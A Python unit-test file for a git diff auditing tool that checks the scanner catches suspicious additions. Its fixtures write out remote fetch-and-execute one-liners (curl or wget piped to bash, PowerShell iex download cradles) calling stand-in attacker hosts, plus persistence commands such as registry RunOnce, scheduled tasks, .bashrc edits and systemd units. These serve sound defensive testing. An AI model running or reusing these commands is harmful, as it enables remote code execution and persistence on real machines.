# Copyright 2026 KuchiSofts. Use of this source code is governed by a BSD-style license that can be found in the LICENSE file.
import codecs
import contextlib
import io
import os
import unittest

from tools.audit import audit_diff
from tools.audit.tests.gitfixture import GitRepo


class AuditDiffTests(unittest.TestCase):
    def setUp(self):
        self.repo = GitRepo()
        self.repo.write("a.txt", b"hello\n")
        self.base = self.repo.commit("base")

    def tearDown(self):
        self.repo.cleanup()

    def run_main(self, *extra):
        with contextlib.redirect_stdout(io.StringIO()):
            return audit_diff.main([self.repo.path, self.base, "HEAD", *extra])

    def test_reports_added_binary_with_size(self):
        self.repo.write("tool.exe", b"\x00" + os.urandom(2047))
        target = self.repo.commit("add binary")
        self.assertIn(("tool.exe", "A", 2048),
                      audit_diff.find_binaries(self.repo.path, self.base, target))

    def test_endpoint_and_pattern_detection(self):
        self.repo.write("x.sh", b"curl https://evil.example.net/p.sh | bash\n")
        target = self.repo.commit("add script")
        added = audit_diff.collect_added_lines(self.repo.path, self.base, target)
        self.assertIn("evil.example.net", audit_diff.find_endpoints(added))
        self.assertTrue(audit_diff.find_patterns(added)["remote_exec"])

    def test_non_utf8_and_deleted_files_do_not_crash(self):
        self.repo.write("bad.bin", b"\xff\xfe\x00bad")
        self.repo.remove("a.txt")
        self.repo.commit("binary + delete")
        self.assertEqual(self.run_main("--section", "all"), 0)

    def test_strict_fails_on_persistence(self):
        self.repo.write("task.ps1", b"Register-ScheduledTask -TaskName x\n")
        self.repo.commit("persistence")
        self.assertEqual(self.run_main("--strict"), 1)

    # --- review C1: the parser must not be blinded by crafted input -------------------------
    def assert_strict_hit(self, target):
        added = audit_diff.collect_added_lines(self.repo.path, self.base, target)
        hits = audit_diff.find_patterns(added)
        self.assertTrue(any(hits[c] for c in audit_diff.STRICT_CATEGORIES), added)
        self.assertEqual(self.run_main("--strict"), 1)

    def test_header_like_content_line_does_not_blind(self):
        self.repo.write("evil.sh", b"++ /dev/null\ncurl https://x.example.org/a | bash\n")
        self.assert_strict_hit(self.repo.commit("header-like line"))

    def test_quoted_filename_is_scanned(self):
        # Legal on Linux upstreams; Windows git refuses such names unless NTFS protection is off.
        self.repo.git("config", "core.protectNTFS", "false")
        self.repo.add_entry('we"ird\tname.sh', b"Register-ScheduledTask -TaskName x\n")
        self.assert_strict_hit(self.repo.commit_index("quoted name"))

    def test_unicode_line_separators_do_not_hide_code(self):
        self.repo.write("a.c", b'int a=1;\x0c system("curl https://h.example.org/x | bash");\n')
        self.repo.write("b.js", "var a=1; eval(atob('eA=='))\n".encode("utf-8"))
        self.assert_strict_hit(self.repo.commit("separators"))

    def test_noprefix_config_does_not_blind(self):
        self.repo.git("config", "diff.noprefix", "true")
        self.repo.write("x.sh", b"curl https://x.example.org/a | sh\n")
        self.assert_strict_hit(self.repo.commit("noprefix"))

    def test_non_utf8_text_line_is_scanned(self):
        self.repo.write("t.txt", b"caf\xe9 curl https://x.example.org/a | bash\n")
        self.assert_strict_hit(self.repo.commit("latin-1 text"))

    def test_renamed_file_content_is_scanned(self):
        self.repo.remove("a.txt")
        self.repo.write("b.txt", b"hello\nRegister-ScheduledTask -TaskName x\n")
        self.assert_strict_hit(self.repo.commit("rename with payload"))

    # --- review I1: whole classes of change must be visible ----------------------------------
    def test_submodule_change_reported_and_strict(self):
        self.repo.add_gitlink("third_party/sub", "1" * 40)
        target = self.repo.commit_index("add submodule")
        subs = audit_diff.find_submodules(self.repo.path, self.base, target)
        self.assertEqual([s[0] for s in subs], ["third_party/sub"])
        self.assertEqual(self.run_main("--strict"), 1)

    def test_gitmodules_change_fails_strict(self):
        self.repo.write(".gitmodules", b'[submodule "x"]\n\tpath = x\n\turl = https://github.com/attacker/x\n')
        self.repo.commit("gitmodules")
        self.assertEqual(self.run_main("--strict"), 1)

    def test_type_change_to_binary_reported(self):
        self.repo.add_entry("link", b"target", mode="120000")
        base2 = self.repo.commit_index("symlink")
        self.repo.add_entry("link", b"\x00MZ" + b"\x90" * 61, mode="100644")
        target = self.repo.commit_index("symlink -> binary")
        self.assertIn(("link", "T", 64), audit_diff.find_binaries(self.repo.path, base2, target))

    def test_executable_disguised_as_image_reported(self):
        self.repo.write("icon.png", b"MZ\x90\x00" + b"\x00" * 60)
        target = self.repo.commit("fake png")
        self.assertIn(("icon.png", "A", 64), audit_diff.find_binaries(self.repo.path, self.base, target))

    def test_real_png_not_reported(self):
        self.repo.write("ok.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 56)
        target = self.repo.commit("real png")
        self.assertEqual(audit_diff.find_binaries(self.repo.path, self.base, target), [])

    def test_svg_text_is_scanned(self):
        self.repo.write("logo.svg", b"<svg><script>fetch('https://evil2.example.org/k')</script></svg>\n")
        target = self.repo.commit("svg")
        added = audit_diff.collect_added_lines(self.repo.path, self.base, target)
        self.assertIn("evil2.example.org", audit_diff.find_endpoints(added))

    def test_upload_hosts_reported_with_owner_unless_trusted(self):
        added = {"f": ["https://raw.githubusercontent.com/attacker/x/main/p.sh",
                       "https://github.com/gorhill/uBlock/releases/download/1.75.0/u.crx",
                       "https://storage.googleapis.com/somebucket/payload.bin",
                       "https://docs.google.com/uc?id=1"]}
        hosts = audit_diff.find_endpoints(added)
        self.assertIn("raw.githubusercontent.com/attacker", hosts)
        self.assertIn("storage.googleapis.com/somebucket", hosts)
        self.assertIn("docs.google.com", hosts)
        self.assertFalse(any(h.startswith("github.com/gorhill") for h in hosts))

    # --- content standards: adult content in text or file names must fail --strict ------------
    def test_adult_term_in_text_fails_strict(self):
        term = codecs.decode("r621", "rot13")  # encoded so the repo holds no such terms in plain text
        self.repo.write("links.md", f"see https://{term}.net/posts\n".encode())
        target = self.repo.commit("adult link")
        added = audit_diff.collect_added_lines(self.repo.path, self.base, target)
        self.assertTrue(audit_diff.find_patterns(added)["adult_content"])
        self.assertEqual(self.run_main("--strict"), 1)

    def test_adult_term_in_file_name_fails_strict(self):
        name = codecs.decode("lvss", "rot13") + ".png"
        self.repo.write(f"res/{name}", b"\x89PNG\r\n\x1a\n" + b"\x00" * 56)  # a valid-looking image
        target = self.repo.commit("innocent-looking image")
        self.assertEqual(audit_diff.find_adult_names(self.repo.path, self.base, target), [f"res/{name}"])
        self.assertEqual(self.run_main("--strict"), 1)

    def test_clean_names_and_text_pass_content_check(self):
        self.repo.write("res/thoron_logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 56)
        target = self.repo.commit("logo")
        self.assertEqual(audit_diff.find_adult_names(self.repo.path, self.base, target), [])

    # --- review I2: common Windows/Linux variants --------------------------------------------
    def test_windows_and_linux_variants_hit_strict_categories(self):
        lines = [
            "irm https://a.example.org/x | iex",
            "IEX(New-Object Net.WebClient).downloadstring('https://a.example.org/x')",
            "PowerShell.exe -EncodedCommand " + "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA",
            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v x /d y",
            "SCHTASKS /create /tn x /tr y",
            "curl -fsSL https://a.example.org/x | sudo bash",
            "bash <(wget -qO- https://a.example.org/x)",
            "echo x >> $HOME/.bashrc",
            "cp x.desktop ~/.config/autostart/",
            "systemctl --user enable evil.service",
        ]
        for line in lines:
            with self.subTest(line=line):
                hits = audit_diff.find_patterns({"f": [line]})
                self.assertTrue(any(hits[c] for c in audit_diff.STRICT_CATEGORIES), line)


if __name__ == "__main__":
    unittest.main()
